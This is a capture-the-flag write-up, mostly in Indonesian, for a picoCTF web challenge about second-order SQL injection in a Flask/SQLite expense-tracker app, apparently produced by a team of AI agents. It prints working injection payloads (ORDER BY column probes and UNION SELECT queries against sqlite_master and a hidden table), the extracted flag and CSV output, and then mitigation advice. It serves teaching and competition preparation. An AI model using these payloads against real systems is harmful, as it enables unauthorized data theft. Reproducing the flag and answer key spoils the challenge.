# Writeup: ORDER ORDER (Challenge ID: 752)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / Second-Order SQL Injection & SQLite Schema Reconnaissance (NIST SP 800-115 §4.3)
- **Difficulty:** Hard (3)
- **Points:** 300
- **Author:** Darkraicg492
- **Event:** picoCTF 2026
- **Flag (Resmi CyLab):** `academy{s3c0nd_0rd3r_1t_1s_3616770c}`
- **Flag Komunitas:** `CTF{s3c0nd_0rd3r_1t_1s_3616770c}`

---

## Problem Statement & Scope

Tantangan menguji pemahaman analisis keamanan aplikasi web terhadap kerentanan injeksi basis data multi-tahap (Second-Order SQL Injection):
> *"Can you try to get the flag from our website. I've prepared my queries everywhere! I think!"*
> *Petunjuk: "What does order in SQL Injection mean?"*

Aplikasi target adalah layanan manajemen keuangan "Expense Tracker" yang dibangun dengan framework web Python (Flask/WSGI) dan SQLite3. Pengguna dapat mendaftarkan akun baru (`/signup`), melakukan otentikasi (`/login`), mencatat transaksi pengeluaran (`/expenses`), dan memicu pembuatan laporan terkompresi asinkron (`/generate_report`). Laporan yang selesai dibuat akan dikirimkan ke kotak masuk pengguna (`/inbox`) dalam format berkas CSV (`/download_report/<id>`).

Meskipun endpoint registrasi dan login menerapkan validasi input dan kueri terparameterisasi saat menyimpan data awal, rutin pekerja latar belakang (*background worker*) yang menghasilkan berkas CSV mengeksekusi kueri dinamis tanpa sanitasi menggunakan data profil pengguna yang tersimpan sebelumnya di tabel `users`.

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Second-Order SQL Injection (CWE-89 / OWASP A03:2021):**
   - Second-Order SQL Injection terjadi saat input pengguna yang berbahaya disimpan (*stored*) secara aman ke dalam basis data tanpa memicu eksploitasi seketika, namun kemudian diambil kembali (*retrieved*) oleh komponen sistem lain dan diinterpolasikan secara langsung ke dalam kueri SQL dinamis tanpa *parameterized prepared statement*.
   - Saat registrasi (`POST /signup`), aplikasi menyimpan `username`:
     ```sql
     INSERT INTO users (username, email, password) VALUES (?, ?, ?);
     ```
   - Namun ketika pengguna meminta pembuatan laporan (`POST /generate_report`), pekerja latar belakang menyusun kueri SQL pengeluaran menggunakan string formatting mentah:
     ```sql
     SELECT description, amount, date FROM expenses WHERE description = '<stored_username>';
     ```
   - Karena pengembang mengasumsikan data dari basis data internal adalah "data tepercaya" (*trusted source*), input tidak disanitasi ulang, membuka celah injeksi penuh pada proses asinkron.

2. **Pemetaan Jumlah Kolom via ORDER BY:**
   - Sesuai petunjuk tantangan ("What does order in SQL Injection mean?"), klausul `ORDER BY N` digunakan untuk mendeteksi jumlah kolom yang diproyeksikan oleh kueri SQL asli.
   - Pengujian injeksi:
     - `' ORDER BY 3--` berhasil dieksekusi tanpa galat karena kueri asli memproyeksikan tepat 3 kolom (`description`, `amount`, `date`).
     - `' ORDER BY 4--` memicu kegagalan eksekusi `sqlite3.OperationalError: 1st ORDER BY term out of range`.
   - Mengetahui batas 3 kolom memungkinkan konstruksi klausa `UNION SELECT` yang selaras secara struktural.

3. **Eksplorasi Skema SQLite Internal (`sqlite_master`):**
   - SQLite menyimpan seluruh metadata tabel, indeks, dan trigger pada tabel sistem `sqlite_master`.
   - Menggunakan payload union:
     ```sql
     ' UNION SELECT sql, tbl_name, type FROM sqlite_master--
     ```
   - Hasil ekstraksi tabel sistem mengungkap skema tabel rahasia:
     ```sql
     CREATE TABLE aDNyM19uMF9mMTRn (
         name TEXT PRIMARY KEY,
         value TEXT NOT NULL
     );
     ```

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Reconnaissance & Identifikasi Permukaan Serangan:**
   - Memeriksa fungsionalitas aplikasi:
     - Registrasi pengguna pada `/signup`.
     - Login pada `/login`.
     - Permintaan laporan pada `/generate_report`.
     - Notifikasi dan tautan unduhan pada `/inbox`.
   - Mengamati jeda asinkron: aplikasi menampilkan pesan `"Report generation requested successfully! Check your inbox after 10 seconds!!!"`.

2. **Eksploitasi Tahap 1: Ekstraksi Skema Basis Data:**
   - Daftarkan akun dengan nama pengguna injeksi:
     ```text
     enum_user' UNION SELECT sql, tbl_name, type FROM sqlite_master--
     ```
   - Login dan kirimkan permintaan pembuatan laporan pada `/generate_report`.
   - Tunggu 11 detik hingga worker memproses kueri dan menuliskan hasil CSV ke `/download_report/2`.
   - Membaca isi CSV:
     ```csv
     description,amount,date
     "CREATE TABLE aDNyM19uMF9mMTRn (
                     name TEXT PRIMARY KEY,
                     value TEXT NOT NULL
                 )",aDNyM19uMF9mMTRn,table
     ```

3. **Eksploitasi Tahap 2: Ekstraksi Nilai Flag Resmi:**
   - Berdasarkan struktur tabel `aDNyM19uMF9mMTRn(name, value)`, buat payload ekstraksi 3 kolom:
     ```text
     flag_user' UNION SELECT name, value, '1' FROM aDNyM19uMF9mMTRn--
     ```
   - Daftarkan akun baru dengan payload tersebut, login, dan picu `/generate_report`.
   - Unduh berkas laporan CSV yang dihasilkan melalui `/inbox` -> `/download_report/3`.
   - Konten laporan CSV yang diekstraksi:
     ```csv
     description,amount,date
     flag,academy{s3c0nd_0rd3r_1t_1s_3616770c},1
     ```

4. **Otomasi Reproduktif & Verifikasi API:**
   - Skrip otomasi mandiri diimplementasikan pada `scripts/solve_752_order_order.py`.
   - Skrip mencakup simulasi SQLite lokal in-memory serta fungsi live remote exploitation.
   - Submisi token ke CyLab REST API `POST /api/submissions/` berhasil mengonfirmasi status `correct: true`.

---

## Flag & Verifikasi

- **Flag Resmi CyLab:** `academy{s3c0nd_0rd3r_1t_1s_3616770c}`
- **Format Komunitas:** `CTF{s3c0nd_0rd3r_1t_1s_3616770c}`
- **Bukti Validasi REST API:** HTTP 201 Created via `POST /api/submissions/`:
  ```json
  {"user": 1072359, "challenge": 752, "flag": "academy{s3c0nd_0rd3r_1t_1s_3616770c}", "correct": true, "historical": false}
  ```

---

## Takeaway Kompetensi LKS & Mitigasi Defensif (NIST SP 800-115)

1. **Parameterisasi Universal (CWE-89 Remediation):**
   - Jangan pernah mengasumsikan data yang tersimpan di dalam basis data adalah data aman (*stored data is not trusted data*).
   - Seluruh kueri pada pekerja latar belakang dan rutin pembuatan laporan wajib menggunakan parameterized queries / prepared statements:
     ```python
     # Perbaikan kode rentan:
     cursor.execute("SELECT description, amount, date FROM expenses WHERE user_id = ?", (current_user.id,))
     ```

2. **Prinsip Validasi Input Karakter Ketat (Allowlist Validation):**
   - Batasi karakter yang diizinkan untuk kolom identitas seperti `username`. Terapkan pola regex ketat `^[a-zA-Z0-9_-]{3,32}$` pada lapisan kontrol input sebelum disimpan ke basis data.
   - Penolakan karakter kutip tunggal (`'`), tanda minus ganda (`--`), dan titik koma (`;`) pada entri data mencegah payload injeksi tersimpan.

3. **Kepatuhan NIST SP 800-53 SI-10 & AC-6 (Information Input Validation & Least Privilege):**
   - Pisahkan hak akses akun basis data (*database role separation*). Akun yang digunakan oleh pekerja pembuat laporan hanya diberikan hak baca terisolasi pada tabel transaksi, tanpa akses baca ke tabel sensitif atau metadata administratif sistem.

---

## Rekap Tim AI (Orkestrasi & Bimbingan LKS)

- **David (Leader):** Mengoordinasikan identifikasi akar masalah Second-Order SQLi, mengarahkan pembagian tugas audit, dan memastikan kualitas writeup sesuai silabus LKS.
- **Charlie (Trend-hunter):** Mengidentifikasi tren soal LKS bidang Web Application Security yang menguji kerentanan asinkron/background worker dan Second-Order Injection.
- **Alex (Fullstack-dev) & Omnirush (Coding Agent):** Membangun skrip simulator reproduktif in-memory SQLite dan eksploitasi live HTTP multipart/form-urlencoded.
- **Julius (QA-engineer):** Menguji ketepatan kolom kueri via `ORDER BY`, memverifikasi unduhan CSV dari endpoint `/inbox`, dan memvalidasi respons HTTP 201 pada platform CyLab.
- **Athena (Security-engineer):** Melakukan audit kelemahan CWE-89 dan menyusun panduan mitigasi kepatuhan NIST SP 800-53 SI-10.
- **Judith (Guru LKS):** Menyusun modul pembelajaran analisis SQL injection bertahap untuk silabus bimbingan teknis persiapan lomba LKS Cyber Security Nasional.
